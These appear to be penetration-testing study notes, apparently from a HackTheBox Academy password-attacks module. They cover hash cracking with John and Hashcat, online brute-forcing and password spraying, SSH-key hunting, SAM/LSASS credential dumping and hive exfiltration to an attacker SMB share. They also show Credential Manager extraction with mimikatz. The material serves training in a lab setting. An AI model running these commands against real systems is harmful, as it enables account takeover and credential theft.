## 🔁 Mutating a known OLD password (the `stom` case)

When you crack/find a password that **fails** because it was rotated (e.g. a vault named `*_OLD`, or a known prior password), the new one is usually a **small mutation** of it — password‑expiry policies push users to increment.

```bash
# 1. base word
echo 'fails-nibble-disturb4' > base.txt
# 2. generate variants with rules (increment digit, toggle case, append symbol/year)
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
# tight hand-list when lockout is a risk:
printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
# 3. spray the mutations (CAREFULLY — see lockout below)
proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
```

Most likely single change: **the trailing number increments** (`...4` → `...5`). Then case of the first letter, then a trailing `!`/year.

## 🔒 Lockout discipline (don't lock the account)

Spraying can **lock accounts** — especially bad on a Domain Admin you need. Always check the policy first and pace yourself.

```bash
# read the policy BEFORE spraying
proxychains nxc smb <DC> -u <valid_user> -p '<valid_pass>' --pass-pol
```
Read these values:

- **Account Lockout Threshold** — bad attempts before lockout. `0` = no lockout (spray freely). If e.g. `5`, you get ≤4 tries per window per account.
- **Reset Account Lockout Counter After** — how long until `BadPW` resets (often 30 min).
- **Account Lockout Duration** — how long a locked account stays locked.

Rules of thumb:

- **One password across all users** per reset window = safe (that's what spraying is for).
- Watch `BadPW` per account in `--users` output. We pushed `stom`'s `BadPW` to 8 with a careless 4×4 matrix — *don't run a full user×pass matrix against a lockout‑enabled domain.*
- If you must try several passwords at one account (mutations), confirm the threshold gives you room, try the **most likely first**, and wait out the reset window between batches.

## 1. Authentication & Password Fundamentals

<Info>
**Why this matters**

This module attacks the **authentication** tenet of the CIA triad. Authentication = proving identity with one or more factors. Cracking passwords defeats the *something you know* factor.
</Info>

The four authentication factors:

| Factor | Examples |
|--------|----------|
| Something you **know** | password, PIN, passphrase |
| Something you **have** | smart card / CAC, phone, hardware token |
| Something you **are** | fingerprint, face, iris, voice (biometrics) |
| Somewhere you **are** | geolocation, source IP |

Key human-behaviour facts that make password attacks work (Google/Harris 2019, Panda 2025):

- `123456`, `qwerty`, `password` remain among the most common passwords.
- ~**66%** of people reuse passwords across multiple sites → guess once, reuse everywhere.
- Only ~**45%** change a password after a breach → leaked creds stay valid for years.
- Check exposure at **HaveIBeenPwned**.

## 2. Password Cracking Fundamentals

<Info>
**Concept**

Passwords are stored **hashed** (one-way math: MD5, SHA-256, etc.). Cracking = guessing an input, hashing it, and comparing to the target hash. You never "reverse" a hash — you out-guess it.
</Info>

**Generate a hash to experiment:**

```bash
echo -n 'Soccer06!' | md5sum
echo -n 'Soccer06!' | sha256sum
```

- `-n` is critical — it stops `echo` adding a trailing newline that would change the hash.

### The four cracking techniques

| Technique | How it works | When to use |
|-----------|-------------|-------------|
| **Rainbow tables** | Pre-computed hash→password lookup maps | Fast, but defeated by salts |
| **Dictionary / wordlist** | Hash each word in a list of likely passwords | First choice — fast and high hit-rate |
| **Mask / rule** | Brute-force a *defined* keyspace or mutate words | When you know the password pattern/policy |
| **Pure brute-force** | Every possible combination | Last resort; only viable for short (&lt;9 char) passwords |

<Info>
**Salts (why rainbow tables mostly fail today)**

A **salt** is random bytes added to a password *before* hashing, so identical passwords produce different hashes. Salts aren't secret (the system needs them to verify logins) — they're usually prepended to the hash. They make pre-computed rainbow tables useless because the attacker would need a separate table per salt. Even a 1-byte salt multiplies the table size by 256.
</Info>

```bash
# Same password, different hash once salted:
echo -n 'Th1sIsTh3S@lt_Soccer06!' | md5sum
```

<Note>
**Speed depends on algorithm + hardware**

Hashcat on a laptop might do **5,000,000 MD5/sec** but only **~10,000 DCC2/sec**. "Slow" hashes (bcrypt, PBKDF2, DCC2, BitLocker) are designed to resist cracking — strong passwords on them are often uncrackable in a pentest timeframe.
</Note>

**Wordlists:** `rockyou.txt` (≈14M real leaked passwords) and **SecLists**.

```bash
head -n 20 /usr/share/wordlists/rockyou.txt
```

## 3. John the Ripper (JtR)

<Info>
**When to use**

The Swiss-army knife of offline cracking. Great for Linux hashes, the huge family of `*2john` extractors, and "just point it at a file." Use the **jumbo** build (more formats, faster). Command name is `john`.
</Info>

### Cracking modes

**Single crack mode** — best for Linux creds; mutates the username/GECOS (full name, etc.) into guesses.

```bash
john --single passwd
```

- Reads identity info straight out of a `/etc/passwd`-style line (username, real name, home dir) and applies mutation rules (e.g. `Bob Smith` → `Smith1`).

**Wordlist mode** — the standard dictionary attack.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=rockyou.txt --rules hashes.txt     # apply mutation rules
```

- Multiple wordlists: separate with commas.
- `--rules` appends numbers, capitalizes, adds symbols, leet-subs, etc.

**Incremental mode** — smart brute-force using Markov statistics (tries likely combos first).

```bash
john --incremental hashes.txt
```

- Most exhaustive, slowest. Charsets/lengths defined in `/etc/john/john.conf`.

```bash
grep '# Incremental modes' -A 100 /etc/john/john.conf   # view built-in charsets
```

**Show cracked results:**

```bash
john --show hashes.txt
```

### Identifying the hash format

```bash
hashid -j '193069ceb0461e1d40d216e32c79c704'   # -j = also print the JtR format name
```

- JtR can't always auto-detect. Use `hashid`, JtR's sample-hash docs, or PentestMonkey's list. **Context matters** — where the hash came from often tells you the format.
- Force a format with `--format=<name>` (e.g. `--format=raw-md5`, `--format=nt`).

### Cracking files — the `*2john` extractors

<Info>
**Concept**

A `2john` tool reads a protected file and emits a JtR-compatible hash you can then crack normally.
</Info>

```bash
<tool> <file_to_crack> > file.hash      # general pattern
locate *2john*                          # list every extractor on the box
```

| Tool | Extracts hash from |
|------|--------------------|
| `ssh2john` | SSH private keys |
| `office2john` | Word/Excel/PowerPoint |
| `pdf2john` | PDFs |
| `zip2john` / `rar2john` / `7z2john` | archives |
| `keepass2john` | KeePass DBs |
| `bitlocker2john` | BitLocker volumes |
| `gpg2john` | GPG-encrypted data |

## 4. Hashcat

<Info>
**When to use**

GPU-accelerated, the fastest option when you have a decent graphics card. Same crack-then-reuse workflow as JtR but faster on large jobs.
</Info>

**General syntax:**

```bash
hashcat -a <attack_mode> -m <hash_type> <hashes> [wordlist | rule | mask]
```

- `-a` = attack mode (`0` dictionary, `3` mask)
- `-m` = hash type ID (`0` MD5, `100` SHA1, `1000` NTLM, `2100` DCC2, `22100` BitLocker…)
- `<hashes>` = a hash string **or** a file of same-type hashes

**Identify the mode:**

```bash
hashcat --help | grep -i ntlm        # search the mode list
hashid -m '$1$FNr44XZC$wQxY6...'      # -m = print the Hashcat mode number
```

### Common hash-type IDs

| ID | Hash |
|----|------|
| `0` | MD5 |
| `100` | SHA1 |
| `1400` | SHA2-256 |
| `1700` | SHA2-512 |
| `1000` | NTLM (Windows NT hash) |
| `2100` | Domain Cached Creds 2 (DCC2) |
| `22100` | BitLocker |

### Dictionary attack (`-a 0`)

```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
# add rules when the wordlist alone fails:
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

- Rule files live in `/usr/share/hashcat/rules/` — `best64.rule` (64 common mutations) is the go-to first try. Others: `rockyou-30000.rule`, `d3ad0ne.rule`, `dive.rule`.

### Mask attack (`-a 3`)

<Info>
**When to use**

When you know the **shape** of the password (length + character pattern). Far faster than full brute-force because you only search the defined keyspace.
</Info>

```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

Built-in charsets:

| Symbol | Set |
|--------|-----|
| `?l` | a–z |
| `?u` | A–Z |
| `?d` | 0–9 |
| `?s` | symbols / space |
| `?a` | `?l?u?d?s` (everything printable) |
| `?h` / `?H` | hex lower / upper |
| `?b` | 0x00–0xff (raw bytes) |

- Example `?u?l?l?l?l?d?s` = Uppercase, 4×lowercase, digit, symbol (e.g. `Hello1!`).
- Custom sets: define with `-1 -2 -3 -4`, reference with `?1 ?2 ?3 ?4`.

## 5. Writing Custom Wordlists & Rules

<Info>
**Why**

Password policies push users into predictable patterns. Targeted, mutated lists beat generic ones — and generic lists are often blocked/flagged. OSINT (pet names, company, hobbies, birth year) makes guesses land.
</Info>

Common policy-driven mutations users apply:

| Pattern | Example |
|---------|---------|
| Capitalize first letter | `Password` |
| Append numbers | `Password123` |
| Append year | `Password2022` |
| Append month | `Password02` |
| End with `!` | `Password2022!` |
| Leet substitutions | `P@ssw0rd2022!` |

### Hashcat rule functions

| Function | Meaning |
|----------|---------|
| `:` | do nothing (keep original) |
| `l` / `u` | lowercase / uppercase all |
| `c` | Capitalize first, lowercase rest |
| `sXY` | replace all `X` with `Y` (e.g. `so0`, `sa@`) |
| `$X` | append character `X` (e.g. `$!`) |

**Apply a rule file to a wordlist and save the mutations:**

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

- `--stdout` = print candidates instead of cracking (use it to *generate* lists).
- One input word + the rule set above → ~15 variants (`Password`, `P@ssw0rd!`, etc.).

### CeWL — scrape a website into a wordlist

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

- `-d 4` spider depth, `-m 6` minimum word length, `--lowercase`, `-w` output file.
- Feed the result into Hashcat/JtR with a rule file for company-specific guesses.

<Tip>
**Targeted attack recipe**

CeWL the company site → combine with OSINT terms (names, pets, sports, birth years) → run through `best64.rule` or a custom rule → crack. This is how you beat a 12-char policy without brute-forcing.
</Tip>

## 6. Cracking Protected Files

### Hunting for encrypted files

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

- Loops over likely document extensions, hides noise (`lib`, `fonts`, etc.). Reference list of encrypted-file extensions: FileInfo.

### Hunting for SSH private keys

<Info>
**SSH keys have no fixed extension — match on content instead.**

Private keys always start with `-----BEGIN ... PRIVATE KEY-----`.
</Info>

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

**Is the key encrypted (passphrase-protected)?**

```bash
ssh-keygen -yf ~/.ssh/id_rsa
```

- If it prints the public key → not encrypted. If it **prompts for a passphrase** → encrypted, so it's crackable. (Old PEM keys also show `Proc-Type: 4,ENCRYPTED` in the header; modern keys look identical either way.)

### Crack an encrypted SSH key

```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```

### Crack Office documents & PDFs

```bash
office2john.py Protected.docx > protected.hash
john --wordlist=rockyou.txt protected.hash
john protected.hash --show

pdf2john.py PDF.pdf > pdf.hash      # same flow, different extractor
john --wordlist=rockyou.txt pdf.hash
```

<Warning>
**Reality check**

Strong, random passwords on documents may be **uncrackable** in a reasonable time. Still worth trying — protected files often hide credentials that unlock further access.
</Warning>

## 7. Cracking Protected Archives

### ZIP files

```bash
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
```

### OpenSSL-encrypted GZIP (`.gzip` that isn't really gzip)

<Info>
**Identify the real format first**

Some "archives" are actually OpenSSL blobs. `file` reveals the truth.
</Info>

```bash
file GZIP.gzip                       # -> "openssl enc'd data with salted password"
```

**Brute the password with a for-loop (extracts only on the correct key):**

```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
ls    # a new extracted file appears if a password worked
```

- Ignore the flood of `gzip: stdin: not in gzip format` errors — those are just wrong-password attempts.

### BitLocker-encrypted drives

```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash      # $0 = the password hash (the others are recovery-key hashes)
hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
```

- `bitlocker2john` emits 4 hashes: first two = password, last two = the 48-digit recovery key (not guessable). Crack the `$bitlocker$0$...` one.
- AES = slow; expect long run times.

**Mount the cracked drive on Linux (dislocker):**

```bash
sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
# when done:
sudo umount /media/bitlockermount && sudo umount /media/bitlocker
```

- On Windows: just double-click the `.vhd`, then enter the password.

## 8. Attacking Network Services (Online Brute-Force)

<Warning>
**Online = noisy and risky**

These attacks hit a **live service**, generate logs/alerts, and can trigger **account lockouts**. Throttle threads, prefer spraying over brute-forcing, and know the lockout policy before you start.
</Warning>

The credential-bearing services you'll target: **WinRM, SSH, RDP, SMB** (also FTP, MSSQL, LDAP, VNC, etc.).

### WinRM (5985/HTTP, 5986/HTTPS)

<Info>
**What it is**

Windows Remote Management — remote command execution on Windows. Must be manually enabled on Win10/11.
</Info>

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

- `(Pwn3d!)` in NetExec output = the creds work **and** you can likely execute commands.

**Get an interactive shell with valid creds:**

```bash
evil-winrm -i 10.129.42.197 -u user -p password
```

- Installs via `sudo gem install evil-winrm`. Gives a PowerShell Remoting session.

### NetExec (the multi-protocol workhorse)

<Info>
**One tool, many protocols**

Supports `nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc`. Used for spraying, brute-forcing, share enumeration, hash dumping, and more.
</Info>

```bash
sudo apt-get -y install netexec
netexec -h                              # general help
netexec smb -h                          # protocol-specific options
netexec <proto> <target> -u <user|userlist> -p <pass|passlist>
```

### SSH (22)

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
ssh user@10.129.42.197                  # log in once cracked
```

- `-L` userlist, `-P` passlist (lowercase `-l`/`-p` for a single value). SSH often limits parallel tasks → add `-t 4`.

### RDP (3389)

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
```

- RDP hates parallel connections → Hydra auto-reduces to `-t 4`; add `-W 1`/`-W 3` to wait between tries.

### SMB (445)

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

<Warning>
**Hydra SMBv3 error**

`[ERROR] invalid reply from target smb://...` means your Hydra is too old for SMBv3. Use Metasploit instead:
</Warning>

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

**Enumerate shares & access them with valid creds:**

```bash
netexec smb 10.129.42.197 -u user -p password --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

## 9. Spraying, Stuffing & Defaults

### Password spraying

<Info>
**One password, many users**

Avoids lockouts by trying a **single** common/default password against **many** accounts (e.g. `ChangeMe123!` left on new accounts). The inverse of brute-forcing one account with many passwords.
</Info>

```bash
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
```

### Credential stuffing

<Info>
**Reuse from a breach**

Use `username:password` pairs leaked from one service against another (works because ~66% reuse passwords).
</Info>

```bash
hydra -C user_pass.list ssh://10.100.38.23
```

- `-C` takes a combined `user:pass` file (one pair per line).

### Default credentials

Routers, firewalls, databases, and appliances ship with defaults that often go unchanged.

```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys                    # look up known defaults by vendor/product
```

- Also check vendor documentation and router default-credential lists. Build a `user:pass` list and feed it to `hydra -C`.

## 10. Windows Authentication Internals (Theory)

<Info>
**Know the targets before the attacks**

Sections 11–14 extract credentials from these stores. Understanding what each one is tells you *what* you can steal and *what privileges* you need.
</Info>

| Component | What it is | Where |
|-----------|-----------|-------|
| **LSASS** | `lsass.exe` — authenticates users, **caches live credentials in memory** | `%SystemRoot%\System32\lsass.exe` |
| **SAM** | Local account password hashes (LM/NTLM) | `%SystemRoot%\system32\config\SAM`, mounted at `HKLM\SAM` |
| **SYSTEM** | Holds the **boot key** that decrypts the SAM | `HKLM\SYSTEM` |
| **SECURITY** | LSA secrets: cached domain creds (DCC2), DPAPI keys, sometimes cleartext | `HKLM\SECURITY` |
| **Credential Manager / Vault** | Per-user saved creds for sites, RDP, shares, etc. (DPAPI-encrypted) | `%UserProfile%\AppData\...\Microsoft\Vault|Credentials\` |
| **NTDS.dit** | The **entire domain's** user hashes (on Domain Controllers) | `%SystemRoot%\ntds\NTDS.dit` |

- **Workgroup** machine → validates logins against local **SAM**. **Domain-joined** → validates against **NTDS.dit** on a Domain Controller.
- Accessing SAM/LSASS requires **SYSTEM/admin**. SAM hashes need **SYSTEM** to decrypt → that's why you grab the SYSTEM hive too.
- **SYSKEY** partially encrypts the on-disk SAM (since NT 4.0).

## 11. Attacking SAM, SYSTEM & SECURITY

<Info>
**Goal**

With local admin, copy the three registry hives, exfiltrate them, and crack hashes **offline** (no need to stay on the box).
</Info>

The three hives:

| Hive | Why you need it |
|------|-----------------|
| `HKLM\SAM` | the local password hashes |
| `HKLM\SYSTEM` | boot key to **decrypt** those hashes (mandatory) |
| `HKLM\SECURITY` | cached domain creds (DCC2), DPAPI keys, LSA secrets (optional but valuable) |

**1. Save the hives (elevated cmd):**

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

**2. Exfil over SMB to your attack box:**

```bash
# attacker:
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/you/Documents/
```

```cmd
:: target:
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

**3. Dump hashes offline with secretsdump:**

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

- Output format: `user:RID:LMhash:NThash:::` — the **NT hash** is the part you crack. (`secretsdump` grabs the bootkey first, then decrypts.)

**4. Crack the NT hashes (mode 1000):**

```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

- `31d6cfe0d16ae931b73c59d7e0c089c0` is the NT hash of an **empty password** — you'll see it a lot.

**DCC2 (cached domain creds, from SECURITY) — mode 2100:**

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d975...' /usr/share/wordlists/rockyou.txt
```

<Warning>
**DCC2 is ~800× slower than NTLM**

Uses PBKDF2 and **cannot** be used for Pass-the-Hash. Only worth it for weak passwords.
</Warning>

**DPAPI:** `HKLM\SECURITY` also yields DPAPI machine/user keys, which decrypt saved browser/RDP/Wi-Fi creds (via Impacket `dpapi`, mimikatz, or DonPAPI).

### Remote dumping with NetExec (no manual hive copy)

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam     # dump SAM remotely
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa     # dump LSA secrets remotely
```

## 12. Attacking LSASS

<Info>
**Why LSASS**

LSASS caches the credentials of **currently logged-on users** in memory (hashes, sometimes cleartext, Kerberos tickets, DPAPI keys). Dump its memory, then parse it offline.
</Info>

### Create the memory dump

**GUI — Task Manager:** Details/Processes → right-click *Local Security Authority Process* → **Create dump file** (saved to `%temp%\lsass.DMP`).

**CLI — rundll32 + comsvcs.dll** (need the PID first):

```cmd
tasklist /svc | findstr lsass          :: cmd: find the PID
```
```powershell
Get-Process lsass                       # PowerShell: PID is the Id field
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

<Warning>
**AV/EDR flags this**

The `comsvcs.dll MiniDump` technique is well-known and usually caught by modern AV. AV bypass is out of scope for this module.
</Warning>

### Parse the dump offline with pypykatz

<Info>
**pypykatz = Mimikatz in Python → runs on your Linux attack box (Mimikatz is Windows-only).**

</Info>

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

What the output gives you:

| Block | Meaning |
|-------|---------|
| **MSV** | the user's **NT & SHA1 hashes** (crack with `-m 1000`, or Pass-the-Hash) |
| **WDIGEST** | old protocol — on legacy systems shows the **cleartext password**; disabled by default on modern Windows |
| **Kerberos** | cached tickets/keys → reuse against other domain hosts |
| **DPAPI** | masterkeys to decrypt saved app secrets |

**Crack the recovered NT hash:**

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## 13. Attacking Windows Credential Manager

<Info>
**What it is**

Per-user encrypted store of saved credentials (websites, RDP, OneDrive, network shares). Vault folders hold a `Policy.vpol` with AES keys protected by DPAPI.
</Info>

Vault/Credential locations:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
```

**Enumerate stored creds:**

```cmd
cmdkey /list
```

- `Domain Password` type with `interactive=...` = reusable for logon. `Generic` `virtualapp/didlogical` = internal Live ID, ignore.

**Use a stored credential without knowing the password (impersonate):**

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

- Spawns a process as that user using the saved credential.

**Extract the actual cleartext with Mimikatz:**

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

- Other tools: **SharpDPAPI**, **LaZagne**, **DonPAPI**.
- Export vaults to a `.crd` file: `rundll32 keymgr.dll,KRShowKeyMgr`.
